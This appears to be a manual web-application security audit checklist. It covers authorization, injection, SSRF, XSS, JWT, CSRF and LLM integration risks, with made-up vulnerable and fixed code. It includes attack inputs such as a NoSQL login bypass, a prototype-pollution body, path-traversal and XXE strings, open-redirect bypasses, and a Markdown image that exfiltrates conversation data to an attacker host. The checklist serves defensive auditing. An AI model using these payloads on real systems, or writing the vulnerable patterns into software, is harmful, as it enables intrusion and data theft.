# Manual expert checklist

What to read for, class by class, where scanners are blind. Every code
snippet in this file is **made-up** for illustration (Express/TypeScript
unless stated); the patterns are language-independent. Real examples are
cited as `file:line` in the fixture `scripts/fixtures/vulnerable-app`.

How to use each section:

1. Run the **leads** search as written, from the repository root:
   `<skill>/scripts/leads.sh` prints `file:line` only; add `-c` to see the
   line with every quoted literal emptied and comments dropped. It skips
   `.env*`, keys, bundles, lockfiles and `node_modules`.
2. Answer the **question** for each candidate by reading the code around it.
3. Decide, and write the decision down for every section that applies:

| Verdict | When | Example |
|---|---|---|
| **Finding** | The control is missing or wrong, and an attacker can reach the code | `exec('ping ' + req.query.host)` on a public route |
| **Dismissed** | The control is there (cite its `file:line`), or no attacker input reaches the line | `innerHTML = ''` clears a node |
| **Unknown** | You could not follow the value or find the control | input goes through a helper in a package you cannot read: list it under "Not covered" |

Label a finding with the CWE given, then look up OWASP and ASVS in
`owasp-cwe-map.md`.

**Secret-safe leads.** Never swap `leads.sh` for `grep -n` or your own
search tool: a `webhook` lead also matches `new Stripe("sk_live_...")`.
Searches for a credential name, or in `.env*` and bundles, use `grep -l`.

**Scoping, when a lead returns more than about 50 lines.** Do not read them
in file order and do not stop silently. Read first the lines in code that
handles authentication, tenants, writes, uploads, webhooks and admin
functions, reached from an external entry point. Then sample the rest, and
write in the report's "Not covered" what was sampled: "section 18, logging:
40 of 310 hits read, all in `src/auth/` and `src/billing/`".

Order matters: sections 1 to 3b hold most critical findings in real audits
and almost none of the scanner hits.

---

## 1. Missing authorization on a route (CWE-862)

**Leads**: list every route. `<skill>/scripts/leads.sh "\.(get|post|put|patch|delete)\(|@(Get|Post|Put|Patch|Delete)\(|@app\.route|router\.|path\(|HandleFunc"`.

**Question**: for each route, which line decides who may call it? Build a
table: route, auth required (y/n), role or scope required, where enforced.
A row with an empty last column is a finding or a deliberately public route.

```ts
// BAD: the admin router is mounted without the guard the others have
app.use('/api/users', requireAuth, usersRouter);
app.use('/api/admin', adminRouter);

// GOOD: deny by default, opt out explicitly
app.use('/api', requireAuth);
app.use('/api/admin', requireRole('admin'), adminRouter);
```

Traps: a guard declared on the controller class but a method that overrides
it (`@Public()` in NestJS); authorization done only in the front-end (a
hidden button); a `GET` guarded and the matching `DELETE` not; a GraphQL
resolver or a WebSocket handler outside the HTTP middleware chain.

The route grep is not the inventory. Entry points with no HTTP verb need
their own row: GraphQL resolvers (check nested fields, not only the root
query), WebSocket events, queue consumers, scheduled jobs, and bulk, list
and export operations. Reconcile the table with the router registration and
the schema; a row you could not review is "Unknown", not absent.

## 2. Object-level authorization, IDOR (CWE-639)

**Leads**: every handler that takes an identifier from the request:
`<skill>/scripts/leads.sh "params\.[a-zA-Z]*[iI]d|findById|findUnique|findOne|get_object_or_404|WHERE id ="`.

**Question**: after the object is loaded, which line compares its owner or
tenant with the caller's? If the answer is "none, but ids are UUIDs", it is
still a finding: ids leak through logs, URLs, exports and referrers.

```ts
// BAD (same shape as the fixture, src/app.js:43): any logged-in user reads any invoice
const invoice = await db.invoice.findUnique({ where: { id: req.params.id } });
res.json(invoice);

// GOOD: ownership is part of the query, so a foreign id returns 404
const invoice = await db.invoice.findFirst({
  where: { id: req.params.id, tenantId: req.user.tenantId },
});
if (!invoice) return res.sendStatus(404);
```

Check write paths with more care than read paths (`PATCH /orders/:id`), and
nested resources (`/projects/:projectId/files/:fileId`: is `fileId` checked
against `projectId`, and `projectId` against the user?). Multi-tenant apps:
search for queries that have no tenant filter at all, and for the tenant
missing outside the database: a cache key (`cache.get('invoice:' + id)`
shared by all tenants), a search index, an object-storage path, an export
job, a field returned to a role that should not see it.

## 3. Incorrect authorization (CWE-863)

**Question**: is the check that exists correct?

```ts
// BAD: role read from the request body, which the caller writes
if (req.body.role === 'admin') { /* ... */ }

// BAD: truthy check, any non-empty string passes
if (req.user.isAdmin) // where isAdmin comes from an unvalidated JWT claim "isAdmin": "false"

// GOOD: role from the server-side session or a verified token, compared strictly
if (req.user.roles.includes('admin')) { /* ... */ }
```

Traps: privilege fields the user can set through profile update (section
12); horizontal checks done on the wrong id (`req.body.userId` instead of
`req.user.id`); feature flags used as access control.

## 3b. Business logic and races (CWE-362, CWE-367, CWE-841, CWE-837)

No grep finds these. For each operation that moves money, stock, credits,
votes or a one-time right, ask three questions.

| Question | Bad | Good |
|---|---|---|
| Is check-then-act atomic? | read balance, compare, then write in a second statement | one conditional statement, a unique constraint, or a row lock in a transaction |
| Can a step be skipped or replayed? | `POST /checkout/confirm` works without the payment step; a coupon or reset link works twice | the server stores the workflow state and refuses out-of-order or repeated calls |
| Who sets the amount? | price, currency, quantity or discount read from the request; negative quantity accepted | recomputed server-side from the catalogue; bounds checked |

```ts
// BAD: two parallel requests both pass the check, the balance goes negative
const { balance } = await db.account.findUnique({ where: { id } });
if (balance >= amount) await db.account.update({ where: { id }, data: { balance: balance - amount } });

// GOOD: the check and the write are one statement; 0 rows updated means refused
const done = await db.$executeRaw`UPDATE account SET balance = balance - ${amount} WHERE id = ${id} AND balance >= ${amount}`;
```

A web race needs no luck: a few dozen parallel requests are enough, from
any account. Score it E2, not E1.

## 4. JWT misuse (CWE-347, CWE-287, CWE-798)

**Leads**: `<skill>/scripts/leads.sh "jwt\.|jsonwebtoken|jose|decode\(|verify\(|algorithms|HS256|RS256"`, and for the key itself, file names only: `grep -rlE "JWT_SECRET|SIGNING_KEY"`.

| Question | Bad | Good |
|---|---|---|
| Is the signature verified? | `jwt.decode(token)` used to authenticate | `jwt.verify(token, key, opts)` |
| Is the algorithm pinned? | no `algorithms` option, or `['none']`, or HS256 and RS256 both accepted | `algorithms: ['RS256']` |
| Are `iss` and `aud` checked? | not passed to `verify` | `issuer`, `audience` set |
| Is `exp` required, enforced and short? | `ignoreExpiration: true`; tokens valid for days; a token with no `exp` accepted | minutes, with refresh; an explicit check that `exp` is present |
| Where is the key? | a signing secret as a string in the repo; any `*_SECRET` in front-end code | secret manager; for verification, the public keys of the configured issuer's JWKS, never a URL taken from the token |

```ts
// BAD: accepts a token for another application, signed with any accepted algorithm
const claims = jwt.verify(token, process.env.JWT_SECRET);

// GOOD
const claims = jwt.verify(token, publicKey, {
  algorithms: ['RS256'], issuer: 'https://id.example.test/realms/app', audience: 'invoices-api',
});
if (typeof claims.exp !== 'number') throw new Error('token without exp');
```

Why `aud` matters: with a shared IdP (for example Keycloak), a token issued for app A is validly signed
for app B too. Without the audience check, any user of A is a user of B.

`exp` trap, checked on `jsonwebtoken` 9: `verify` rejects an expired token
but accepts one that carries **no** `exp` at all. Look for an explicit
presence check, as above, or `requiredClaims: ['exp']` in `jose`. `maxAge`
is not that check: it caps the age counted from `iat` and still accepts a
token with `iat` and no `exp` (also checked).

Front-end: a secret in a bundle is public, and `VITE_`, `NEXT_PUBLIC_`,
`REACT_APP_` variables ship by design: `grep -rlE "SECRET|PRIVATE|API_KEY" dist/`.

### OAuth 2.0 / OIDC login, when the app is a client of an IdP (CWE-352, CWE-287, CWE-601)

**Leads**: `<skill>/scripts/leads.sh "authorize|/callback|code_verifier|code_challenge|state|nonce|email_verified|response_type"`.

| Question | Bad | Good |
|---|---|---|
| Is the callback bound to the browser that started the login? | no binding at all: no `state` compared, no PKCE, no `nonce` checked | one of them enforced (RFC 9700 4.7.1: PKCE, if the IdP supports it, or `nonce` also protect). Trace it in the client library; unverifiable is Unknown |
| Is the code protected? | public client (SPA, mobile) without PKCE; `response_type=token` (implicit flow, token in the URL) | authorization code + PKCE with `S256` |
| Is `redirect_uri` exact? | prefix or wildcard match registered at the IdP | full-string match |
| Which token is used for what? | the ID token sent to an API as a credential | access token for APIs, ID token only to learn who logged in |
| How is the IdP identity linked to a local account? | matched on `email`, verified or not | login matches the stored `iss` + `sub` pair; a **new** link to an existing account needs proof of control of that account (its password, or a logged-in session) |

OIDC Core 5.7: `iss` and `sub` together are the only claims a client can
rely on as a stable identifier; an email can be reassigned, and two issuers
can assert the same one. Made-up example: the app links by email; an
attacker registers `victim@corp.test` at a second, laxer IdP the app also
accepts, and is logged into the victim's account. `email_verified` narrows
this, it does not close it.

## 5. Sessions and cookies (CWE-614, CWE-1004, CWE-1275, CWE-384, CWE-613)

**Leads**: `<skill>/scripts/leads.sh "cookie\(|Set-Cookie|session\(|cookieSession|express-session|maxAge|sameSite|httpOnly"`, and file names only for `grep -rlE "SESSION_SECRET|COOKIE_SECRET"`.

```ts
// BAD: readable by scripts, sent over HTTP, sent on cross-site requests, lives a year
res.cookie('sid', id, { maxAge: 365 * 24 * 3600 * 1000 });

// GOOD
res.cookie('sid', id, { httpOnly: true, secure: true, sameSite: 'lax', maxAge: 30 * 60 * 1000, path: '/' });
```

Questions: is the session id regenerated at login (fixation)? Does logout
destroy the server-side session, or only delete the cookie? Does a password
change invalidate other sessions? Is `secure` conditional on an environment
variable that production might not set?

## 6. CSRF (CWE-352)

Applies when the browser attaches credentials **automatically**: cookies or
HTTP basic auth. An API that only accepts `Authorization: Bearer` from
JavaScript is not exposed to CSRF.

**Question**: for each state-changing route using cookie auth, what stops a
form on another site from calling it? Acceptable answers: a CSRF token
checked server-side; a required custom header plus a strict CORS policy; a
server-side check of `Origin` or `Sec-Fetch-Site`; or `SameSite=Lax`/`Strict`
with no state change on `GET`, **only if every sibling subdomain is
trusted**. `SameSite` stops other *sites*, not other *origins* of the same
site: a page on `blog.example.test` (a user-content host, a forgotten
subdomain) still sends the cookie to `app.example.test`.

```ts
// BAD: state change on GET with cookie auth; SameSite=Lax does not protect top-level GET navigation
app.get('/account/delete', requireSession, deleteAccount);

// GOOD
app.post('/account/delete', requireSession, csrfProtection, deleteAccount);
```

## 7. CORS (CWE-942)

**Leads**: `<skill>/scripts/leads.sh "Access-Control-Allow|cors\(|origin:|allowedOrigins|CORS_"`.

```ts
// BAD: reflects whatever origin asks, and allows cookies: any site reads the user's data
app.use(cors({ origin: true, credentials: true }));
// BAD: suffix match lets https://evil-example.test through
if (origin.endsWith('example.test')) allow(origin);

// GOOD: exact allowlist
app.use(cors({ origin: ['https://app.example.test'], credentials: true }));
```

`Access-Control-Allow-Origin: *` with `Allow-Credentials: true` is refused by
browsers, so the dangerous form in practice is origin **reflection**. A
wildcard without credentials on a public, unauthenticated API is fine. Also
check for the `null` origin being allowed.

## 8. SSRF (CWE-918)

**Leads**: every outbound request whose URL comes from data:
`<skill>/scripts/leads.sh "fetch\(|axios|got\(|request\(|urllib|requests\.(get|post)|http\.Get|curl_exec|new URL\("`.

**Question**: can a user choose the host? Typical features: webhooks with a
user-supplied URL, "import from URL", avatar by URL, PDF or screenshot
rendering, link previews, OIDC discovery with a user-supplied issuer.

```ts
// BAD: fetches http://169.254.169.254/latest/meta-data/ or http://localhost:6379 on request
const res = await fetch(req.body.imageUrl);

// GOOD when the destinations are known: exact allowlist of origins the team
// controls (scheme + host + port), redirects refused
const url = new URL(req.body.imageUrl);
if (!ALLOWED_ORIGINS.has(url.origin)) return res.sendStatus(400);   // e.g. 'https://img.example.test'
const out = await fetch(url, { redirect: 'error' });
```

Compare `url.origin`, not `url.hostname`: the hostname drops the port, so
`https://img.example.test:6379/` would pass a hostname allowlist.

When users may name **any** host (webhooks, link previews), no allowlist
exists and a hostname check is not a control: the name can resolve to
`169.254.169.254` or `10.x`, and can resolve differently between the check
and the request (DNS rebinding). The control is then the address actually
connected to: an egress proxy that refuses private, loopback and link-local
ranges, or a check on the resolved IP made by the same socket that connects.
If neither is in the code, it is a finding. A blocklist of `127.0.0.1` and
`localhost` is not a fix: `http://[::1]/`, decimal IPs and redirects bypass
it. Network-level egress rules are audit-infra's; name it.

## 9. Injection: SQL, NoSQL, command, code, template

**SQL (CWE-89)**. Leads: `<skill>/scripts/leads.sh 'query\(|execute\(|raw\(|\$queryRawUnsafe|createQueryBuilder|\.format\(|f"SELECT|\+ *req\.'` (single quotes: in double quotes the shell expands `$queryRawUnsafe`).

```ts
// BAD
db.query(`SELECT * FROM users WHERE email = '${req.query.email}'`);
// BAD: identifiers cannot be parameterised, so this is injectable too
db.query(`SELECT * FROM users ORDER BY ${req.query.sort}`);

// GOOD
db.query('SELECT * FROM users WHERE email = $1', [req.query.email]);
const sort = ['name', 'created_at'].includes(req.query.sort) ? req.query.sort : 'name';
```

ORMs bind **values**; they are unsafe at the raw escape hatch: `$queryRawUnsafe`
(Prisma), `sequelize.query` with concatenation, `.raw()` (Knex), `extra()` /
`RawSQL` (Django), `text()` with f-strings (SQLAlchemy). They also do not
protect the query's **structure**: a filter, sort field or operator object
taken whole from the request (`where: req.query.filter`) lets the caller
query columns and relations nobody meant to expose. Allowlist fields and
operators.

**NoSQL (CWE-943)**.

```ts
// BAD: body {"email": "a@b.test", "password": {"$ne": null}} logs in without the password
db.users.findOne({ email: req.body.email, password: req.body.password });

// GOOD: reject non-strings, look up by email only, then verify the password hash
if (typeof req.body.email !== 'string' || typeof req.body.password !== 'string') return res.sendStatus(400);
const user = await db.users.findOne({ email: req.body.email });
if (!user || !(await argon2.verify(user.passwordHash, req.body.password))) return res.sendStatus(401);
```

**OS command (CWE-78)**. Leads: `<skill>/scripts/leads.sh "exec\(|execSync|spawn\(|system\(|popen|subprocess|shell=True|os\.system|Runtime\.getRuntime"`.

```ts
// BAD (fixture, src/app.js:18)
exec('ping -c 1 ' + req.query.host);

// GOOD: no shell, arguments as an array, value validated, options ended with --
if (!/^[a-z0-9]([a-z0-9.-]*[a-z0-9])?$/i.test(host)) return res.sendStatus(400);
execFile('ping', ['-c', '1', '--', host]);
```

Even without a shell, an argument starting with `-` is read as an option
(`--output=/etc/cron.d/x`). A validator such as `/^[a-z0-9.-]+$/i` lets
`-f` through: the pattern must refuse a leading `-`, and `--` goes before
user values when the program supports it.

**Code (CWE-94, CWE-95)**. Leads: `<skill>/scripts/leads.sh "eval\(|new Function|vm\.run|setTimeout\( *[^ a-zA-Z_(]|exec\(compile|__import__"`.
Fixture: `src/app.js:12`. There is no safe way to evaluate user-provided
code in-process: the fix is a parser for the small language actually needed.

**Template (CWE-1336)**. A template **string** built from user input is
code: `nunjucks.renderString(req.body.tpl)`, `Template(user_input).render()`
(Jinja2), `ejs.render(userString)`. Passing user data as template
*variables* is fine.

## 10. Path traversal (CWE-22)

**Leads**: `<skill>/scripts/leads.sh "readFile|createReadStream|sendFile|res\.download|open\(|path\.join|os\.path\.join|unzip|extract"`.

```ts
// BAD: name = "../../etc/passwd"; path.join does not stop it
res.sendFile(path.join(UPLOAD_DIR, req.params.name));

// GOOD: resolve, then verify the result is still inside the base directory
const full = path.resolve(UPLOAD_DIR, req.params.name);
if (!full.startsWith(path.resolve(UPLOAD_DIR) + path.sep)) return res.sendStatus(400);
```

`path.resolve` only edits the string: it does not follow symlinks. Where
users can create entries in the directory (uploads, extracted archives),
compare `fs.realpath` of both paths, or better, never build a path from
user input: store files under a generated id and look the id up.

Also: archive extraction writing entries named `../../x` ("zip slip"), and
`os.path.join(base, user)` in Python, which **discards** `base` when `user`
is absolute.

## 11. Unsafe deserialization (CWE-502)

**Leads**: `<skill>/scripts/leads.sh "pickle\.loads?|yaml\.load\(|unserialize\(|ObjectInputStream|node-serialize|Marshal\.load|BinaryFormatter|jsonpickle"`.

**Question**: can the bytes come from a user, a cookie, a queue others can
write to, or a cache shared with a less trusted service?

```python
# BAD: arbitrary code execution on load
data = pickle.loads(base64.b64decode(request.cookies["prefs"]))
cfg = yaml.load(request.data, Loader=yaml.Loader)   # also UnsafeLoader; bare yaml.load() before 5.1
# FullLoader: not RCE by itself (PyYAML 6.0.4 rejects !!python/object/apply), but CVEs before 5.4: check the version

# GOOD
data = json.loads(request.cookies["prefs"])
cfg = yaml.safe_load(request.data)
```

## 11b. XML external entities, XXE (CWE-611)

Only if the application parses XML: SOAP, SAML, SVG, Office documents, RSS,
invoices. **Leads**:
`<skill>/scripts/leads.sh "DocumentBuilderFactory|SAXParser|XMLInputFactory|lxml|etree|xml\.dom|DOMDocument|LIBXML_NOENT|simplexml|libxmljs|xml2js|fast-xml-parser"`.

**Question**: can the document come from a user, and does the parser resolve
DTDs or external entities?

```python
# BAD: resolves <!ENTITY x SYSTEM "file:///etc/passwd"> and returns the file
tree = lxml.etree.fromstring(request.data, lxml.etree.XMLParser(resolve_entities=True))

# GOOD: a parser that refuses DTDs and entities
tree = defusedxml.ElementTree.fromstring(request.data)
```

Java parsers are unsafe by default: look for `disallow-doctype-decl` set to
true on the factory. PHP: `LIBXML_NOENT` turns entity substitution **on**.

## 12. Mass assignment (CWE-915) and prototype pollution (CWE-1321)

**Leads**: `<skill>/scripts/leads.sh "\.create\(req\.body|\.update\(req\.body|Object\.assign\([^,]+, *req\.|\.\.\.req\.body|\*\*request\.(data|json)|fields = '__all__'|merge\(|defaultsDeep"`.

```ts
// BAD: body {"email": "...", "role": "admin", "tenantId": "other"} is written as is
await db.user.update({ where: { id: req.user.id }, data: req.body });

// GOOD: an explicit allowlist, ideally a validation schema (zod, class-validator, pydantic)
const { displayName, locale } = UpdateProfile.parse(req.body);
await db.user.update({ where: { id: req.user.id }, data: { displayName, locale } });
```

Prototype pollution: a recursive merge of user JSON into an object, with a
key `__proto__` or `constructor.prototype`. Fixture: `src/app.js:50`,
`_.defaultsDeep({}, req.body)` with lodash 4.17.4. The primitive was
checked in Docker: the body `{"constructor":{"prototype":{"isAdmin":true}}}`
makes `({}).isAdmin` true for the whole process. What it leads to depends on
the **gadgets** present, meaning code that reads a property it never set:
`if (user.isAdmin)` on an object without that field now passes. Report the
primitive as confirmed and name the gadget you found, or say none was traced.

## 13. XSS sinks (CWE-79)

**Leads**: `<skill>/scripts/leads.sh "dangerouslySetInnerHTML|v-html|innerHTML|outerHTML|insertAdjacentHTML|document\.write|bypassSecurityTrust|\[innerHTML\]|\{\{\{|\| *safe|html_safe|mark_safe|res\.send\("`.

| Framework | Sink | Safe by default |
|---|---|---|
| React | `dangerouslySetInnerHTML`, `href={userUrl}` with `javascript:` | `{value}` in JSX |
| Vue | `v-html`, `:href` with `javascript:` | `{{ value }}` |
| Angular | `bypassSecurityTrustHtml/Url/Script/ResourceUrl`, `[innerHTML]` with a bypassed value | interpolation; `[innerHTML]` is sanitised unless bypassed |
| Lit / vanilla | `unsafeHTML`, `innerHTML`, `insertAdjacentHTML`, `document.write` | `textContent`, Lit templates |
| Server templates | `{{{ }}}` (Handlebars), `\| safe` (Jinja2), `<%- %>` (EJS), `html_safe` (Rails), `mark_safe` (Django) | default escaping |

**Question**: where does the value come from? Trace it back to the URL
(`location.hash`, `location.search`), a `postMessage`, an API response
holding user content (a comment, a display name, a file name), or Markdown
rendered without sanitising.

```tsx
// BAD (fixture equivalent: src/widget.js:6)
<div dangerouslySetInnerHTML={{ __html: comment.body }} />

// GOOD: render as text, or sanitise with a maintained library right at the sink
<div>{comment.body}</div>
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />
```

Sanitising at input time and trusting the database afterwards is fragile:
the next writer may not sanitise. Sanitise where the HTML is produced.

## 14. Open redirect (CWE-601)

**Leads**: `<skill>/scripts/leads.sh "redirect\(|location\.href *=|window\.location *=|returnUrl|redirect_uri|next=|continue="`.

```ts
// BAD (fixture, src/app.js:28)
res.redirect(req.query.next);

// GOOD: parse against a fixed base, then redirect to the URL that was validated
const BASE = 'https://app.example.test';
let u;
try { u = new URL(String(req.query.next ?? '/'), BASE); } catch { u = new URL(BASE); }
res.redirect(u.origin === BASE ? u.href : BASE + '/');
```

Emit `u.href`, the URL you validated, never `u.pathname`: for
`next=/.//evil.test` Express 4 then sends `Location: //evil.test`, another
host. Re-verify on the emitted header: `new URL(location, BASE).origin`
must equal `BASE`.

String tests are not enough: `//evil.test`, `/\evil.test` and
`/<tab>/evil.test` all start with `/` and all leave the site, because
browsers drop tabs and newlines and read `\` as `/`. Checked in Node 22:
`new URL("/\t/evil.test", base).href` is `https://evil.test/`.

In an OAuth flow, a loose `redirect_uri` match turns an open redirect into
token theft: the IdP must compare the full URI exactly.

## 15. Authentication endpoints: rate limiting, enumeration, reset (CWE-307, CWE-640)

**Question**: what stops 10 000 password attempts on one account, or one
password tried on 10 000 accounts? Look for a limiter on login, password
reset, OTP check, signup, and "resend code". Per IP alone is not enough
(botnets); per account alone locks victims out. Expect both, plus a delay.

```ts
// BAD: tells an attacker which emails exist
if (!user) return res.status(404).json({ error: 'No account with this email' });

// GOOD: same response, same timing, whether or not the account exists
return res.json({ message: 'If this address is registered, an email was sent.' });
```

Reset tokens: random from a CSPRNG, single use, expiring in minutes, stored
hashed, and bound to the account. A 6-digit OTP with no attempt limit is
guessable in at most a million requests.

Two header-trust checks (CWE-640, CWE-348). Leads:
`<skill>/scripts/leads.sh "headers\.host|req\.hostname|get\('host'\)|x-forwarded-(host|for)|trust proxy|req\.ip|REMOTE_ADDR"`.

```ts
// BAD: the reset link is built from a header the attacker sends; the victim
// receives a genuine email whose link points at the attacker's host
const link = `https://${req.headers.host}/reset?token=${token}`;
// GOOD: a configured base URL
const link = `${config.publicBaseUrl}/reset?token=${token}`;
```

And `X-Forwarded-For`: if the app trusts it from anyone (`trust proxy:
true` with no proxy in front, or the header read directly), each request
can claim a new IP, which defeats per-IP rate limits and IP allowlists.

## 16. Password storage (CWE-916)

**Leads**: `<skill>/scripts/leads.sh "createHash\(|md5|sha1|sha256|hashlib|bcrypt|argon2|scrypt|pbkdf2"`, and file names only for `grep -rliE "password"`, then read the hashing code in those files.

```ts
// BAD (fixture, src/app.js:33): fast hash, no salt
crypto.createHash('md5').update(password).digest('hex');
// ALSO BAD: SHA-256 is a fine hash and a poor password hash: billions of guesses per second

// GOOD: a memory-hard or deliberately slow KDF, per-password salt built in
await argon2.hash(password);              // argon2id
await bcrypt.hash(password, 12);
```

Also: comparing secrets with `===` leaks timing; use a constant-time compare
(`crypto.timingSafeEqual`, `hmac.compare_digest`). If the app delegates
login to an IdP, check that no local password table survives next to it.

## 17. Cryptography misuse (CWE-338, CWE-327, CWE-328, CWE-321)

**Leads**: `<skill>/scripts/leads.sh "Math\.random|random\.(random|randint|choice)|rand\(|createCipher\(|aes-...-ecb|DES|RC4|MODE_ECB|iv *= *['\"]|new Buffer\(16\)"`.

```ts
// BAD (fixture, src/app.js:38): predictable; Math.random is not a CSPRNG
const token = Math.random().toString(36).slice(2);
// GOOD
const token = crypto.randomBytes(32).toString('base64url');

// BAD: ECB leaks patterns; a constant IV weakens CBC and is fatal for GCM
crypto.createCipheriv('aes-256-ecb', key, null);
// GOOD: AES-256-GCM, a fresh random 12-byte IV per message, the auth tag stored and checked
```

`Math.random()` is fine for a shuffle animation and a finding for a reset
token, a session id, an API key, a filename meant to be unguessable, or an
OTP. Judge by use, not by presence. Home-made crypto (XOR "encryption",
custom signature schemes) is a finding on sight.

## 18. Logging of secrets and personal data (CWE-532), error leakage (CWE-209)

**Leads**: `<skill>/scripts/leads.sh "console\.(log|error)|logger\.|log\.(info|debug|error)|print\(|stack|traceback|DEBUG *= *True|NODE_ENV"`.

```ts
// BAD: passwords, tokens and card numbers end up in the log platform
logger.info('login attempt', { body: req.body, headers: req.headers });
// BAD: the client receives the SQL text and the stack
res.status(500).json({ error: err.message, stack: err.stack });

// GOOD
logger.info('login attempt', { email: hashForLogs(req.body.email), ip: req.ip });
res.status(500).json({ error: 'Internal error', requestId });
```

Check the reverse too: are failed logins, access-denied events and admin
actions logged at all (CWE-778)? An audit trail that misses them cannot
support an incident investigation.

## 18b. Resource limits and ReDoS (CWE-770, CWE-1333)

**Leads**: `<skill>/scripts/leads.sh "express\.json\(|bodyParser|limit|pageSize|per_page|take:|LIMIT|depthLimit|complexity|new RegExp\("`.

| Question | Bad | Good |
|---|---|---|
| Is the body size capped? | parser default raised, or `limit: '500mb'` | a limit sized for the route, also at the proxy |
| Is the page size capped? | `take: Number(req.query.limit)`; `Math.min(limit, 100)` alone (`-1` passes: SQLite reads a negative `LIMIT` as no limit) | an integer checked within `1..100`, else 400 |
| GraphQL: depth, cost, batching? | no depth or complexity limit; 100 aliased `login` fields in one operation count as one request, and as one operation, for the rate limit | depth and cost limits; the login limiter sits in the resolver or the auth service and counts each attempt |
| Regex on user input? | nested quantifiers such as `(a+)+$`, or `new RegExp(userInput)` | a linear pattern, a length cap before matching |
| Archive extraction? | unbounded total size and entry count | caps on both (and section 10 for entry names) |

Usually E3 x I1 or E2 x I1: Medium at most, unless one request takes the
service down for every tenant.

## 19. File upload (CWE-434)

**Leads**: `<skill>/scripts/leads.sh "multer|upload|multipart|formidable|FileField|UploadFile|move_uploaded_file|originalname|filename"`.

| Question | Bad | Good |
|---|---|---|
| Is the size limited? | no limit | limit in the parser and at the proxy |
| How is the type decided? | client `Content-Type` or the extension | content sniffing against an allowlist |
| Where is it stored? | under the web root, or next to code | object storage or a directory never executed |
| What name is used? | `file.originalname` | a generated id; the original kept as metadata |
| How is it served back? | same origin, inline | separate origin or `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff` |

An uploaded SVG or HTML served inline from the app's origin is a stored XSS.
An uploaded archive that is extracted server-side goes through section 10.

## 20. Webhook signature verification (CWE-345)

**Leads**: `<skill>/scripts/leads.sh "webhook|/hooks?/|x-hub-signature|stripe-signature|x-signature|svix|hmac"`.

```ts
// BAD: anyone who knows the URL can post "payment succeeded"
app.post('/webhooks/payment', express.json(), (req, res) => markPaid(req.body.orderId));

// GOOD: HMAC over the RAW body, constant-time compare, timestamp checked against replay
app.post('/webhooks/payment', express.raw({ type: 'application/json' }), (req, res) => {
  const expected = crypto.createHmac('sha256', WEBHOOK_SECRET).update(req.body).digest();
  const given = Buffer.from(String(req.get('x-signature')), 'hex');
  if (given.length !== expected.length || !crypto.timingSafeEqual(given, expected)) return res.sendStatus(401);
  /* ... then check the event timestamp and de-duplicate by event id ... */
});
```

Common mistake: verifying the signature of the **re-serialised** JSON
instead of the raw bytes, which fails randomly and ends with someone
disabling the check. Also verify the handler is idempotent: providers retry.

## 21. LLM integration risks (CWE-1427, CWE-79, CWE-862)

Only if the application calls a model. **Leads**:
`<skill>/scripts/leads.sh -i "openai|anthropic|bedrock|vertex|ollama|langchain|llamaindex|chat\.completions|messages\.create|tool_use|function_call|mcp"`.

Principle: everything the model reads is attacker-influenced (a user
message, a retrieved document, a web page, an email, a file name), and
everything the model writes is therefore untrusted input for the rest of
the system.

| Question | Bad | Good |
|---|---|---|
| Whose rights do tool calls run with? | a service account that can read every tenant | the end user's identity and scopes, checked in the tool, not in the prompt |
| Can a tool change state without a human? | `send_email`, `delete_record`, `run_sql` called directly | read-only by default; confirmation for writes |
| How is the output displayed? | Markdown or HTML rendered raw (`dangerouslySetInnerHTML`), images from any URL | rendered as text or sanitised; remote images blocked or proxied |
| Is the output executed? | passed to `eval`, a shell, a SQL engine, even after a schema check (a valid string is still code) | never executed: typed arguments mapped to a fixed set of operations, parameterised queries |
| What is in the system prompt? | API keys, internal URLs, other users' data | nothing secret: assume it leaks |
| Is retrieved content separated from instructions? | concatenated into one string | delimited and marked as data; still not a security boundary |
| Are cost and loops bounded? | unlimited tokens, unlimited tool iterations | caps per request and per user |

```ts
// BAD: the model decides which customer to read; the tool trusts it
tools: { getInvoice: ({ invoiceId }) => db.invoice.findUnique({ where: { id: invoiceId } }) }

// GOOD: the tool enforces the caller's tenant, whatever the model asked for
tools: { getInvoice: ({ invoiceId }) => db.invoice.findFirst({ where: { id: invoiceId, tenantId: ctx.user.tenantId } }) }
```

A Markdown image `![x](https://attacker.test/?q=<conversation>)` in model
output exfiltrates data the moment the client renders it, with no click.
"The system prompt tells it not to" is never a mitigation: write the control
in code. Map to OWASP LLM01, LLM05, LLM06 (see `owasp-cwe-map.md`).

---

# Front-end specifics

## 22. Token storage (CWE-922)

**Leads**: `<skill>/scripts/leads.sh "localStorage|sessionStorage|indexedDB|document\.cookie"`.

Anything in `localStorage` is readable by every script on the origin,
including a compromised dependency or a single XSS. Fixture:
`src/widget.js:16`. Preferred: session in an `HttpOnly` cookie set by a
back-end that keeps the tokens itself (the "BFF" pattern, see the
glossary), or tokens held in memory and renewed in the background.

Severity is contextual. A short-lived access token in `sessionStorage` on an
app with a strict CSP is Low; a long-lived refresh token in `localStorage`
on an app that renders user HTML is High.

## 23. postMessage (CWE-346)

**Leads**: `<skill>/scripts/leads.sh "addEventListener\(['\"]message|onmessage|postMessage\("`.

```ts
// BAD (fixture, src/widget.js:10): any window that frames or opens the page can drive it
window.addEventListener('message', (e) => { panel.innerHTML = e.data; });
// BAD: sends data to whoever happens to be the parent
parent.postMessage({ token }, '*');

// GOOD
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://app.example.test') return;
  panel.textContent = String(e.data);
});
parent.postMessage({ ready: true }, 'https://app.example.test');
```

Origin checks done with `indexOf` or `endsWith` are bypassable
(`https://app.example.test.attacker.test`). Compare the whole string.

## 24. Content Security Policy

Read the policy where it is set: a `<meta http-equiv>`, a server
middleware (`helmet`), a reverse-proxy config, a framework config. Observed
headers on a deployed URL are **web-analysis**' job; this step reads the
source of truth.

| Directive | Bad | Good |
|---|---|---|
| `script-src` | `'unsafe-inline'`, `'unsafe-eval'`, `*`, `https:`, a CDN hosting arbitrary user content | a nonce or hash per script, with `'strict-dynamic'`; or `'self'` alone |
| `object-src` | absent **and** no restrictive `default-src` | `'none'` |
| `base-uri` | absent (no fallback to `default-src`) | `'self'` or `'none'` |
| `frame-ancestors` | absent (no fallback either), or set only in a `<meta>` | `'none'` or the exact embedding origins, in the HTTP header |
| `default-src` | absent | `'self'` or `'none'` |

Judge the **effective** policy, not the presence of a directive:
`default-src 'none'` already blocks objects. `frame-ancestors` is ignored
in a `<meta>` policy (CSP3 specification). `'strict-dynamic'` needs a nonce
or hash, and makes browsers ignore `'self'` and host lists in `script-src`.
A policy that holds up:

```
